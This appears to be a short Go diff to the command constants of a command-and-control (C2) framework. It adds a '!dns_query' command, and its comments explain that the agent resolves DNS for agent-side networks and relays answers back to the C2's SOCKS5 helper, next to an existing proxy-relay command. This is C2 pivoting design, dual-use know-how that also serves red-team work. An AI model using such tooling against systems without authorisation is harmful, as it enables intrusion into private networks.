@@ -24,4 +24,12 @@ const (
 	// C2CmdProxyStart orders the agent to dial a target and open a dedicated
 	// C2 relay stream (Proxy route) so the C2 can forward SOCKS5 traffic to it.
 	C2CmdProxyStart = "!proxy_start"
+
+	// C2CmdDNSQuery orders the agent to resolve a DNS question carried in a
+	// raw RFC 1035 DNS query packet (base64 in --query). The agent answers
+	// with a complete DNS response packet (raw bytes) as if it were a
+	// recursive DNS server for the C2-side SOCKS5/DNS helper: DNS for
+	// agent-side networks must be resolved by the agent, because only the
+	// agent can reach those names.
+	C2CmdDNSQuery = "!dns_query"
 )
